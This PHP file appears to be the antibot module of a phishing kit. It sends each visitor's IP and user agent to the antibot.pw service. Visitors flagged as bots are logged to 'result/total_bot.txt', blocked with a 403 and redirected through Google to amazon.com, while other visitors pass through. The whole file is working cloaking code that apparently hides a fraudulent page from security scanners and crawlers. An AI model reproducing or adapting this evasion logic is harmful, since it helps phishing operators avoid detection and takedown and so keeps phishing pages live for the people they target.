<?php
//require "main.php";
$config_antibot = $setting['api_antibot'];
if(isset($config_antibot)) {
    function getUserIPszz()
    {
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
        if(filter_var($client, FILTER_VALIDATE_IP))
        {
            $ip = $client;
        }
        elseif(filter_var($forward, FILTER_VALIDATE_IP))
        {
            $ip = $forward;
        }else{
            $ip = $remote;
        }

        return $ip;
    }
    $ip = getUserIPszz();
    if($_SESSION['antibot_wasChecked'] == false || !isset($_SESSION['antibot_wasChecked'])){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_USERAGENT, "Antibot Blocker");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_URL, "https://antibot.pw/api/v2-blockers?ip=".$ip."&apikey=".$config_antibot."&ua=".urlencode($_SERVER['HTTP_USER_AGENT']));
        $data = curl_exec($ch);
        curl_close($ch);
        $_SESSION['antibot_wasChecked'] = true;
        $x = json_decode($data,true);
        if($x['is_bot']){
            $_SESSION['is_bot']  = true;
            $file = fopen("antibot-block.txt","a");
            $message = $ip."\n";
            fwrite($file, $message);
            fclose($file);
            $click = fopen("result/total_bot.txt","a");
            fwrite($click,"$ip -> Antibot.PW Blocker"."\n");
            fclose($click);
            header('HTTP/1.0 403 Forbidden');
            die('<script>window.location.replace("https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=2ahUKEwiQ8OTskefnAhXjyDgGHSVfAWgQFjAAegQIERAC&url=https%3A%2F%2Fwww.amazon.com%2F&usg=AOvVaw0dQbbmFVKaWRLUIdNVceg-");</script>');
          
        }else{
          $_SESSION['is_bot']  = false;
        }

    }
}
